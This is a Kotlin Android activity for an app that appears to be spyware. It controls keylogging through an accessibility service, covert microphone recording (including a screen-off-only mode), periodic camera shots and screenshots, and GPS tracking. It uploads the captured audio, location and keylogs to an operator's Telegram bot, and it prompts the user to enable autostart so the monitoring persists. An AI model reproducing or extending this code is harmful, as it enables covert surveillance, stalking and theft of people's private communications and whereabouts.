package com.example.telegramsender

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.text.TextUtils
import android.widget.Button
import android.widget.EditText
import android.widget.Switch
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import android.widget.Toast
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.FormBody
import java.io.IOException

import android.view.View
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.MediaType.Companion.toMediaTypeOrNull

class MainActivity : AppCompatActivity() {

    private lateinit var botTokenEdit: EditText
    private lateinit var chatIdEdit: EditText
    private lateinit var startButton: Button
    private lateinit var stopButton: Button
    private lateinit var statusText: TextView
    private lateinit var cameraSwitch: Switch
    private lateinit var screenshotIntervalEdit: EditText
    private lateinit var audioSwitch: Switch
    private lateinit var audioDurationEdit: EditText
    private lateinit var screenOffOnlySwitch: Switch
    private lateinit var cameraScreenOffSwitch: Switch
    private lateinit var cameraIntervalEdit: EditText
    private lateinit var locationSwitch: Switch
    private lateinit var locationIntervalEdit: EditText

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        botTokenEdit = findViewById(R.id.botToken)
        chatIdEdit = findViewById(R.id.chatId)
        startButton = findViewById(R.id.startButton)
        stopButton = findViewById(R.id.stopButton)
        statusText = findViewById(R.id.statusText)
        cameraSwitch = findViewById(R.id.cameraSwitch)
        screenshotIntervalEdit = findViewById(R.id.screenshotIntervalEdit)
        audioSwitch = findViewById(R.id.audioSwitch)
        audioDurationEdit = findViewById(R.id.audioDurationEdit)
        screenOffOnlySwitch = findViewById(R.id.screenOffOnlySwitch)
        cameraScreenOffSwitch = findViewById(R.id.cameraScreenOffSwitch)
        cameraIntervalEdit = findViewById(R.id.cameraIntervalEdit)
        locationSwitch = findViewById(R.id.locationSwitch)
        locationIntervalEdit = findViewById(R.id.locationIntervalEdit)
        
        val audioOptions = findViewById<View>(R.id.audioOptionsLayout)
        val cameraOptions = findViewById<View>(R.id.cameraOptionsLayout)

        audioSwitch.setOnCheckedChangeListener { _, isChecked ->
            audioOptions.visibility = if (isChecked) View.VISIBLE else View.GONE
        }

        cameraSwitch.setOnCheckedChangeListener { _, isChecked ->
            cameraOptions.visibility = if (isChecked) View.VISIBLE else View.GONE
        }
        
        locationSwitch.setOnCheckedChangeListener { _, isChecked ->
            locationIntervalEdit.visibility = if (isChecked) View.VISIBLE else View.GONE
        }

        // ... (reuse screenshotButton logic) ...
        val screenshotButton = findViewById<Button>(R.id.screenshotButton)
        screenshotButton.text = "Enable Accessibility Service"
        screenshotButton.setOnClickListener {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivity(intent)
        }

        loadSavedValues()
        updateStatus()

        // ... (Xiaomi & Tests) ...
        if (android.os.Build.MANUFACTURER.equals("Xiaomi", ignoreCase = true)) {
            Toast.makeText(this, "MIUI Detected: Please enable 'Autostart' and Lock the app in Recents to prevent stopping.", Toast.LENGTH_LONG).show()
        }

        findViewById<Button>(R.id.testConnectionButton).setOnClickListener {
             // ... existing test logic ...
             val token = botTokenEdit.text.toString().trim()
             val chatId = chatIdEdit.text.toString().trim()
             if (token.isEmpty() || chatId.isEmpty()) {
                Toast.makeText(this, "Please enter Bot Token and Chat ID", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
             Toast.makeText(this, "Sending Test Message...", Toast.LENGTH_SHORT).show()
             val client = OkHttpClient()
             CoroutineScope(Dispatchers.IO).launch {
                try {
                    val url = "https://api.telegram.org/bot$token/sendMessage"
                    val body = FormBody.Builder().add("chat_id", chatId).add("text", "Test Message").build()
                    val request = Request.Builder().url(url).post(body).build()
                    client.newCall(request).execute().use { response ->
                         withContext(Dispatchers.Main) {
                            if (response.isSuccessful) Toast.makeText(this@MainActivity, "Success!", Toast.LENGTH_LONG).show()
                            else Toast.makeText(this@MainActivity, "Failed: ${response.code}", Toast.LENGTH_LONG).show()
                         }
                    }
                } catch(e:Exception) { withContext(Dispatchers.Main) { Toast.makeText(this@MainActivity, "Error: ${e.message}", Toast.LENGTH_LONG).show() } }
             }
        }

        val testAudioBtn = findViewById<Button>(R.id.testAudioButton)
        val testScreenshotBtn = findViewById<Button>(R.id.testScreenshotButton)
        val testLocationBtn = findViewById<Button>(R.id.testLocationButton)

        testScreenshotBtn.setOnClickListener {
            val token = botTokenEdit.text.toString().trim()
            val chatId = chatIdEdit.text.toString().trim()
            if (token.isEmpty() || chatId.isEmpty()) {
                Toast.makeText(this, "Creds missing", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            if (!isAccessibilityServiceEnabled()) {
                Toast.makeText(this, "Enable Accessibility first", Toast.LENGTH_LONG).show()
                return@setOnClickListener
            }
            Toast.makeText(this, "Requesting Test Screenshot...", Toast.LENGTH_SHORT).show()
            sendBroadcast(Intent("com.example.telegramsender.ACTION_TEST_SCREENSHOT"))
        }

        testLocationBtn.setOnClickListener {
            val token = botTokenEdit.text.toString().trim()
            val chatId = chatIdEdit.text.toString().trim()
            if (token.isEmpty() || chatId.isEmpty()) {
                Toast.makeText(this, "Creds missing", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            
            if (android.os.Build.VERSION.SDK_INT >= 23 && checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                requestPermissions(arrayOf(android.Manifest.permission.ACCESS_FINE_LOCATION), 101)
                return@setOnClickListener
            }

            Toast.makeText(this, "Fetching Location...", Toast.LENGTH_SHORT).show()
            
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
                    val providers = lm.getProviders(true)
                    var bestLoc: android.location.Location? = null
                    for (p in providers) {
                        val l = lm.getLastKnownLocation(p) ?: continue
                        if (bestLoc == null || l.accuracy < bestLoc.accuracy) {
                            bestLoc = l
                        }
                    }
                    
                    if (bestLoc != null) {
                        val url = "https://api.telegram.org/bot$token/sendLocation"
                        val body = FormBody.Builder()
                            .add("chat_id", chatId)
                            .add("latitude", bestLoc.latitude.toString())
                            .add("longitude", bestLoc.longitude.toString())
                            .build()
                        val request = Request.Builder().url(url).post(body).build()
                        val client = OkHttpClient()
                        client.newCall(request).execute().use { response ->
                            withContext(Dispatchers.Main) {
                                if (response.isSuccessful) Toast.makeText(this@MainActivity, "Location Sent!", Toast.LENGTH_SHORT).show()
                                else Toast.makeText(this@MainActivity, "Failed: ${response.code}", Toast.LENGTH_SHORT).show()
                            }
                        }
                    } else {
                        withContext(Dispatchers.Main) { Toast.makeText(this@MainActivity, "No location available (GPS off?)", Toast.LENGTH_LONG).show() }
                    }
                } catch (e: Exception) {
                    withContext(Dispatchers.Main) { Toast.makeText(this@MainActivity, "Loc Error: ${e.message}", Toast.LENGTH_LONG).show() }
                }
            }
        }

        testAudioBtn.setOnClickListener {
            testAudioBtn.isEnabled = false
            testAudioBtn.text = "Initializing..."
            
            val token = botTokenEdit.text.toString().trim()
            val chatId = chatIdEdit.text.toString().trim()
            
            if (token.isEmpty() || chatId.isEmpty()) {
                Toast.makeText(this, "Creds missing", Toast.LENGTH_SHORT).show()
                testAudioBtn.isEnabled = true
                testAudioBtn.text = "Test Audio (Record 5s & Send)"
                return@setOnClickListener
            }
            
            // Stop Service forcefully
            stopService(Intent(this, MonitorService::class.java))
            Toast.makeText(this, "Stopping BG Service...", Toast.LENGTH_SHORT).show()
            
            if (android.os.Build.VERSION.SDK_INT >= 23 && checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                requestPermissions(arrayOf(android.Manifest.permission.RECORD_AUDIO), 102)
                testAudioBtn.isEnabled = true
                testAudioBtn.text = "Test Audio (Record 5s & Send)"
                return@setOnClickListener
            }
            
            CoroutineScope(Dispatchers.IO).launch {
                // Wait for service to really stop and mic to free up
                delay(3000) 
                
                val audioManager = getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
                if (audioManager.mode == android.media.AudioManager.MODE_IN_CALL || 
                    audioManager.mode == android.media.AudioManager.MODE_IN_COMMUNICATION) {
                    withContext(Dispatchers.Main) { 
                        Toast.makeText(this@MainActivity, "Mic Busy (Call Active). Aborting.", Toast.LENGTH_LONG).show()
                        testAudioBtn.isEnabled = true
                        testAudioBtn.text = "Test Audio (Record 5s & Send)"
                    }
                    return@launch
                }

                withContext(Dispatchers.Main) { 
                    testAudioBtn.text = "Recording..." 
                    Toast.makeText(this@MainActivity, "Recording NOW...", Toast.LENGTH_SHORT).show()
                }
                
                var mr: android.media.MediaRecorder? = null
                val file = java.io.File(cacheDir, "test_audio.m4a") 
                
                try {
                    mr = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) android.media.MediaRecorder(this@MainActivity) else android.media.MediaRecorder()
                    
                    mr.apply {
                        setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                        setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4) 
                        setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                        setAudioEncodingBitRate(128000)
                        setAudioSamplingRate(44100)
                        setOutputFile(file.absolutePath)
                        prepare()
                        start()
                    }
                    
                    delay(5000)
                    
                    try { mr.stop() } catch(e:Exception){}
                    mr.release()
                    mr = null
                    
                    withContext(Dispatchers.Main) { 
                        testAudioBtn.text = "Sending HQ..."
                        Toast.makeText(this@MainActivity, "Sending HQ Audio...", Toast.LENGTH_SHORT).show() 
                    }
                    
                    val client = OkHttpClient()
                    val url = "https://api.telegram.org/bot$token/sendAudio"
                    val requestBody = okhttp3.MultipartBody.Builder()
                        .setType(okhttp3.MultipartBody.FORM)
                        .addFormDataPart("chat_id", chatId)
                        .addFormDataPart("audio", "test.m4a",
                            file.readBytes().toRequestBody("audio/m4a".toMediaTypeOrNull(), 0, file.length().toInt()))
                        .build()
                    val request = Request.Builder().url(url).post(requestBody).build()
                    
                    client.newCall(request).execute().use { response ->
                         withContext(Dispatchers.Main) {
                            if (response.isSuccessful) Toast.makeText(this@MainActivity, "SENT SUCCESS!", Toast.LENGTH_LONG).show()
                            else Toast.makeText(this@MainActivity, "Send Fail: ${response.code}", Toast.LENGTH_LONG).show()
                         }
                    }
                    
                } catch(e:Exception) {
                     withContext(Dispatchers.Main) { 
                        Toast.makeText(this@MainActivity, "Rec Error: ${e.message}", Toast.LENGTH_LONG).show() 
                     }
                     e.printStackTrace()
                     try { mr?.reset() } catch(e:Exception){}
                } finally {
                    try { mr?.release() } catch(e:Exception){}
                    withContext(Dispatchers.Main) {
                        testAudioBtn.isEnabled = true
                        testAudioBtn.text = "Test Audio (Record 5s & Send)"
                    }
                }
            }
        }

        startButton.setOnClickListener {
            val token = botTokenEdit.text.toString().trim()
            val chatId = chatIdEdit.text.toString().trim()
            val sendCamera = cameraSwitch.isChecked
            val intervalStr = screenshotIntervalEdit.text.toString().trim()
            val interval = intervalStr.toLongOrNull() ?: 10L
            
            // Audio settings
            val sendAudio = audioSwitch.isChecked
            val audioDurationStr = audioDurationEdit.text.toString().trim()
            val audioDuration = audioDurationStr.toLongOrNull() ?: 60L
            val audioScreenOff = screenOffOnlySwitch.isChecked
            val cameraScreenOff = cameraScreenOffSwitch.isChecked
            val cameraIntervalStr = cameraIntervalEdit.text.toString().trim()
            val cameraInterval = cameraIntervalStr.toLongOrNull() ?: 10L

            // Location settings
            val sendLocation = locationSwitch.isChecked
            val locationIntervalStr = locationIntervalEdit.text.toString().trim()
            val locationInterval = locationIntervalStr.toLongOrNull() ?: 10L

            if (interval < 5) {
                 Toast.makeText(this, "Screenshot Interval must be at least 5 seconds", Toast.LENGTH_SHORT).show()
                 return@setOnClickListener
            }
            if (token.isEmpty() || chatId.isEmpty()) {
                statusText.text = "Please enter values"
                return@setOnClickListener
            }

            // Permissions
            val permissions = mutableListOf<String>()
            if (sendCamera && android.os.Build.VERSION.SDK_INT >= 23) {
                 if (checkSelfPermission(android.Manifest.permission.CAMERA) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                     permissions.add(android.Manifest.permission.CAMERA)
                 }
            }
            if (sendAudio && android.os.Build.VERSION.SDK_INT >= 23) {
                 if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                     permissions.add(android.Manifest.permission.RECORD_AUDIO)
                 }
            }
            if (sendLocation && android.os.Build.VERSION.SDK_INT >= 23) {
                if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    permissions.add(android.Manifest.permission.ACCESS_FINE_LOCATION)
                }
            }
            
            if (permissions.isNotEmpty()) {
                requestPermissions(permissions.toTypedArray(), 101)
                return@setOnClickListener
            }

            saveValues(token, chatId, sendCamera, interval, sendAudio, audioDuration, audioScreenOff, cameraScreenOff, cameraInterval, sendLocation, locationInterval)
            
            // Start Independent Monitor Service (Audio/Camera)
            val monitorIntent = Intent(this, MonitorService::class.java)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(monitorIntent)
            } else {
                startService(monitorIntent)
            }
            
            if (isAccessibilityServiceEnabled()) {
                statusText.text = "All Services Active"
                Toast.makeText(this, "Monitor Service Started + Accessibility Active", Toast.LENGTH_SHORT).show()
            } else {
                statusText.text = "Monitor Service Active. Accessibility Pending."
                Toast.makeText(this, "Audio/Camera Started. Please Enable Accessibility for Keylogs/Screenshots.", Toast.LENGTH_LONG).show()
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                startActivity(intent)
            }
        }
        
        // ... stop button, logs buttons same as before ... 
        stopButton.setOnClickListener {
            // Stop Monitor Service
            stopService(Intent(this, MonitorService::class.java))
            
            if (isAccessibilityServiceEnabled()) {
                Toast.makeText(this, "Disable service in Accessibility Settings to stop Keylogging", Toast.LENGTH_LONG).show()
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                startActivity(intent)
            } else {
                statusText.text = "Services Stopped"
                Toast.makeText(this, "Monitor Service Stopped", Toast.LENGTH_SHORT).show()
            }
        }
        
        if (android.os.Build.MANUFACTURER.equals("Xiaomi", ignoreCase = true)) {
            Toast.makeText(this, "MIUI Detected: Please enable 'Autostart' and Lock the app in Recents to prevent stopping.", Toast.LENGTH_LONG).show()
        }

        findViewById<Button>(R.id.downloadLogsButton).setOnClickListener {
            // Send broadcast to service to upload logs
            val intent = Intent("com.example.telegramsender.ACTION_FORCE_SEND")
            intent.setPackage(packageName) // Restrict to own app
            sendBroadcast(intent)
            Toast.makeText(this, "Requesting Log Upload to Telegram...", Toast.LENGTH_SHORT).show()
        }

        findViewById<Button>(R.id.shareLocalLogsButton).setOnClickListener {
            val file = java.io.File(filesDir, "keylogs.txt")
            if (!file.exists()) {
                 // Create dummy file for testing if missing
                 try { file.writeText("Debug: Log file created manually at " + java.util.Date()) } catch(e:Exception){}
            }
            
            if (file.length() == 0L) {
                 Toast.makeText(this, "Logs are empty.", Toast.LENGTH_SHORT).show()
                 return@setOnClickListener
            }

            try {
                // Read text
                val textContent = file.readText()
                
                // Share as TEXT
                val shareIntent = Intent(Intent.ACTION_SEND).apply {
                    type = "text/plain"
                    putExtra(Intent.EXTRA_SUBJECT, "Keylogs Backup")
                    putExtra(Intent.EXTRA_TEXT, textContent)
                }
                startActivity(Intent.createChooser(shareIntent, "Share Logs Body via..."))

            } catch (e: Exception) {
                Toast.makeText(this, "Error sharing logs: ${e.message}", Toast.LENGTH_LONG).show()
                e.printStackTrace()
            }
        }
    }
    
    private fun isAccessibilityServiceEnabled(): Boolean {
        val expectedComponentName = packageName + "/" + TelegramService::class.java.canonicalName
        val enabledServicesSetting = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        
        val colonSplitter = TextUtils.SimpleStringSplitter(':')
        colonSplitter.setString(enabledServicesSetting)
        
        while (colonSplitter.hasNext()) {
            val componentName = colonSplitter.next()
            if (componentName.equals(expectedComponentName, ignoreCase = true)) {
                return true
            }
        }
        return false
    }
    
    override fun onResume() {
        super.onResume()
        updateStatus()
    }
    
    private fun updateStatus() {
        if (isAccessibilityServiceEnabled()) {
            statusText.text = "Status: Service Active"
            val screenshotButton = findViewById<Button>(R.id.screenshotButton)
            screenshotButton.isEnabled = false
            screenshotButton.text = "Accessibility Enabled"
        } else {
            statusText.text = "Status: Service Inactive"
            val screenshotButton = findViewById<Button>(R.id.screenshotButton)
            screenshotButton.isEnabled = true
            screenshotButton.text = "Enable Accessibility Service"
        }
    }

    private fun loadSavedValues() {
        val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
        botTokenEdit.setText(pref.getString("token", ""))
        chatIdEdit.setText(pref.getString("chatId", ""))
        
        cameraSwitch.isChecked = pref.getBoolean("sendCamera", false)
        cameraScreenOffSwitch.isChecked = pref.getBoolean("cameraScreenOff", false)
        cameraIntervalEdit.setText(pref.getLong("cameraInterval", 10L).toString())
        findViewById<View>(R.id.cameraOptionsLayout).visibility = if (cameraSwitch.isChecked) View.VISIBLE else View.GONE

        screenshotIntervalEdit.setText(pref.getLong("screenshotInterval", 10L).toString())
        
        audioSwitch.isChecked = pref.getBoolean("sendAudio", false)
        audioDurationEdit.setText(pref.getLong("audioDuration", 60L).toString())
        screenOffOnlySwitch.isChecked = pref.getBoolean("audioScreenOff", false)
        findViewById<View>(R.id.audioOptionsLayout).visibility = if (audioSwitch.isChecked) View.VISIBLE else View.GONE

        locationSwitch.isChecked = pref.getBoolean("sendLocation", false)
        locationIntervalEdit.setText(pref.getLong("locationInterval", 10L).toString())
        locationIntervalEdit.visibility = if (locationSwitch.isChecked) View.VISIBLE else View.GONE
    }

    private fun saveValues(token: String, chatId: String, sendCamera: Boolean, interval: Long, sendAudio: Boolean, audioDuration: Long, audioScreenOff: Boolean, cameraScreenOff: Boolean, cameraInterval: Long, sendLocation: Boolean, locationInterval: Long) {
        val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
        pref.edit().putString("token", token)
            .putString("chatId", chatId)
            .putBoolean("sendCamera", sendCamera)
            .putLong("screenshotInterval", interval)
            .putBoolean("sendAudio", sendAudio)
            .putLong("audioDuration", audioDuration)
            .putBoolean("audioScreenOff", audioScreenOff)
            .putBoolean("cameraScreenOff", cameraScreenOff)
            .putLong("cameraInterval", cameraInterval)
            .putBoolean("sendLocation", sendLocation)
            .putLong("locationInterval", locationInterval)
            .apply()
    }
}
